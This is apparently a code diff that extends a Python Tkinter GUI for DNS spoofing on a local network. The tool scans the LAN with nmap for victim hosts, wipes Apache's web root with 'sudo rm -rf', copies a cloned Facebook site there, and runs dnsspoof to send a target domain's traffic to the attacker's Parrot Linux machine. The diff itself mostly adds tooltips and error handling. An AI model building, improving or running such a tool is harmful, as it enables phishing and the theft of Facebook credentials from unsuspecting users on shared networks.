@@ -3,9 +3,30 @@
 import os
 import subprocess
 import tkinter as tk
-from tkinter import filedialog
+from tkinter import filedialog, messagebox, simpledialog
 import netifaces
 import nmap
+
+class Tooltip:
+    def __init__(self, widget, text):
+        self.widget = widget
+        self.text = text
+        self.widget.bind("<Enter>", self.enter)
+        self.widget.bind("<Leave>", self.leave)
+        self.tooltip = None
+
+    def enter(self, event=None):
+        self.tooltip = tk.Toplevel(self.widget)
+        x, y, _, _ = self.widget.bbox("insert")
+        x_root, y_root = self.widget.winfo_rootx() + x + 25, self.widget.winfo_rooty() + y + 20
+        self.tooltip.wm_overrideredirect(True)
+        self.tooltip.wm_geometry(f"+{x_root}+{y_root}")
+        label = tk.Label(self.tooltip, text=self.text, background="#ffffe0", relief="solid", borderwidth=1)
+        label.pack(ipadx=1)
+
+    def leave(self, event=None):
+        if self.tooltip:
+            self.tooltip.destroy()
 
 class DNS_Spoofing_Tool:
     def __init__(self, root):
@@ -17,16 +38,19 @@ class DNS_Spoofing_Tool:
         self.parrot_ip_label.grid(row=0, column=0, padx=10, pady=5)
         self.parrot_ip_entry = tk.Entry(root)
         self.parrot_ip_entry.grid(row=0, column=1, padx=10, pady=5)
+        Tooltip(self.parrot_ip_entry, "Your Parrot Linux IP address.")
 
         # Button to scan for available target IPs
         self.scan_button = tk.Button(root, text="Scan for Target IPs", command=self.scan_ips)
         self.scan_button.grid(row=0, column=2, padx=10, pady=5)
+        Tooltip(self.scan_button, "Scan for available target IP addresses in the network.")
 
         # Label and entry for target domain
         self.target_domain_label = tk.Label(root, text="Target Domain:")
         self.target_domain_label.grid(row=1, column=0, padx=10, pady=5)
         self.target_domain_entry = tk.Entry(root)
         self.target_domain_entry.grid(row=1, column=1, padx=10, pady=5)
+        Tooltip(self.target_domain_entry, "Enter the target domain to spoof.")
 
         # Dropdown for network interface
         self.interface_label = tk.Label(root, text="Network Interface:")
@@ -36,20 +60,24 @@ class DNS_Spoofing_Tool:
         self.interface_var.set(self.interfaces[0])  # Set default value
         self.interface_dropdown = tk.OptionMenu(root, self.interface_var, *self.interfaces)
         self.interface_dropdown.grid(row=2, column=1, padx=10, pady=5)
+        Tooltip(self.interface_dropdown, "Select the network interface to use for DNS spoofing.")
 
         # Label to display available target IPs
         self.target_ips_label = tk.Label(root, text="Available Target IPs:")
         self.target_ips_label.grid(row=3, column=0, padx=10, pady=5)
         self.target_ips_text = tk.Text(root, height=5, width=50)
         self.target_ips_text.grid(row=3, column=1, columnspan=2, padx=10, pady=5)
+        Tooltip(self.target_ips_text, "List of available target IP addresses found in the network.")
 
         # Button to select downloaded Facebook folder
         self.select_folder_button = tk.Button(root, text="Select Downloaded Facebook Folder", command=self.select_folder)
         self.select_folder_button.grid(row=4, column=0, columnspan=2, padx=10, pady=5)
+        Tooltip(self.select_folder_button, "Select the folder containing downloaded Facebook files.")
 
         # Button to start DNS spoofing
         self.start_button = tk.Button(root, text="Start DNS Spoofing", command=self.start_dns_spoofing)
         self.start_button.grid(row=5, column=0, columnspan=2, padx=10, pady=5)
+        Tooltip(self.start_button, "Start DNS spoofing with the specified configuration.")
 
         # Get and display Parrot Linux IP
         self.parrot_ip_entry.insert(0, self.get_parrot_ip())
@@ -61,37 +89,54 @@ class DNS_Spoofing_Tool:
                 return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
 
     def scan_ips(self):
-        # Perform a simple network scan to identify other devices on the network
-        nm = nmap.PortScanner()
-        nm.scan(hosts='192.168.0.0/24', arguments='-sn')
-        
-        # Display the results in the text field
-        for host in nm.all_hosts():
-            manufacturer = nm[host]['vendor'].get('mac') if 'vendor' in nm[host] else "Unknown"
-            self.target_ips_text.insert(tk.END, f"IP: {host}, Manufacturer: {manufacturer}\n")
+        try:
+            # Perform a network scan to identify other devices on the network
+            ip_range = self.get_ip_range()
+            nm = nmap.PortScanner()
+            nm.scan(hosts=ip_range, arguments='-sn')
+
+            # Display the results in the text field
+            self.target_ips_text.delete(1.0, tk.END)  # Clear previous results
+            for host in nm.all_hosts():
+                manufacturer = nm[host]['vendor'].get('mac') if 'vendor' in nm[host] else "Unknown"
+                self.target_ips_text.insert(tk.END, f"IP: {host}, Manufacturer: {manufacturer}\n")
+        except Exception as e:
+            messagebox.showerror("Error", f"An error occurred while scanning IPs: {str(e)}")
+
+    def get_ip_range(self):
+        # Retrieve IP range from user input
+        ip_range_input = simpledialog.askstring("IP Range", "Enter IP range (e.g., 192.168.0.0/24):")
+        if ip_range_input:
+            return ip_range_input
+        else:
+            raise ValueError("Invalid IP range")
 
     def select_folder(self):
         # Opens file dialog to select downloaded Facebook folder
         self.downloaded_folder = filedialog.askdirectory()
 
     def start_dns_spoofing(self):
-        # Get Parrot Linux IP, target domain, and selected network interface
-        parrot_ip = self.parrot_ip_entry.get()
-        target_domain = self.target_domain_entry.get()
-        selected_interface = self.interface_var.get()
+        try:
+            # Get Parrot Linux IP, target domain, and selected network interface
+            parrot_ip = self.parrot_ip_entry.get()
+            target_domain = self.target_domain_entry.get()
+            selected_interface = self.interface_var.get()
 
-        # Update hosts.txt with Parrot Linux IP and target domain
-        hosts_file_path = "/tmp/hosts.txt"
-        with open(hosts_file_path, "w") as f:
-            f.write(f"{parrot_ip} {target_domain}")
+            # Update hosts.txt with Parrot Linux IP and target domain
+            hosts_file_path = "/tmp/hosts.txt"
+            with open(hosts_file_path, "w") as f:
+                f.write(f"{parrot_ip} {target_domain}")
 
-        # Move downloaded Facebook files to Apache's root directory
-        if self.downloaded_folder:
-            os.system(f"sudo rm -rf /var/www/html/*")
-            os.system(f"sudo mv {self.downloaded_folder}/* /var/www/html/")
+            # Move downloaded Facebook files to Apache's root directory
+            if self.downloaded_folder:
+                os.system(f"sudo rm -rf /var/www/html/*")
+                os.system(f"sudo mv {self.downloaded_folder}/* /var/www/html/")
 
-        # Start DNS spoofing with selected network interface
-        subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
+            # Start DNS spoofing with selected network interface
+            subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
+            messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+        except Exception as e:
+            messagebox.showerror("Error", f"An error occurred while starting DNS spoofing: {str(e)}")
 
 if __name__ == "__main__":
     root = tk.Tk()
